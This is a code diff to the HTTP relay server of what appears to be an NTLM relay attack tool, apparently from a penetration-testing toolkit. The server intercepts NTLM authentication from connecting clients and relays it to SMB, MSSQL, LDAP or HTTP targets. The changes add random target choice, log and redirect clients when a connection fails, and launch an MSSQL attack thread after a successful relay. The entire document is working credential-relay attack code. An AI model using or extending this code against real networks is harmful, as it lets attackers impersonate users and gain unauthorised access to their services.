@@ -59,7 +59,7 @@ class HTTPRelayServer(Thread):
             self.authUser = None
             if self.server.mode != 'REDIRECT':
                 if self.server.target is not None:
-                    self.target = self.server.target.get_target(client_address[0])
+                    self.target = self.server.target.get_target(client_address[0],self.server.config.randomtargets)
                     logging.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.target[1]))
                 else:
                     self.target = self.client_address[0]
@@ -125,7 +125,10 @@ class HTTPRelayServer(Thread):
                 messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
 
             if messageType == 1:
-                self.do_ntlm_negotiate(token)
+                if not self.do_ntlm_negotiate(token):
+                    #Connection failed
+                    self.server.target.log_target(self.client_address[0],self.target)
+                    self.do_REDIRECT()
             elif messageType == 3:
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
@@ -171,6 +174,7 @@ class HTTPRelayServer(Thread):
                 except Exception, e:
                     logging.error("Connection against target %s FAILED" % self.target[1])
                     logging.error(str(e))
+                    return False
 
             if self.target[0] == 'MSSQL':
                 try:
@@ -181,6 +185,7 @@ class HTTPRelayServer(Thread):
                 except Exception, e:
                     logging.error("Connection against target %s FAILED" % self.target[1])
                     logging.error(str(e))
+                    return False
             
             if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
                 try:
@@ -192,6 +197,7 @@ class HTTPRelayServer(Thread):
                 except Exception, e:
                     logging.error("Connection against target %s FAILED" % self.target[1])
                     logging.error(str(e))
+                    return False
 
             if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
                 try:
@@ -200,11 +206,13 @@ class HTTPRelayServer(Thread):
                 except Exception, e:
                     logging.error("Connection against target %s FAILED" % self.target[1])
                     logging.error(str(e))
+                    return False
 
             #Calculate auth
             self.challengeMessage = ntlm.NTLMAuthChallenge()
             self.challengeMessage.fromString(clientChallengeMessage)
             self.do_AUTHHEAD(message = 'NTLM '+base64.b64encode(self.challengeMessage.getData()))
+            return True
         
         def do_ntlm_auth(self,token,authenticateMessage):
             #For some attacks it is important to know the authenticated username, so we store it
@@ -273,6 +281,9 @@ class HTTPRelayServer(Thread):
                 clientThread.start()
             if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
                 clientThread = self.server.config.attacks['HTTP'](self.server.config, self.client, self.authUser)
+                clientThread.start()
+            if self.target[0] == 'MSSQL':
+                clientThread = self.server.config.attacks['MSSQL'](self.server.config, self.client)
                 clientThread.start()
 
     def __init__(self, config):
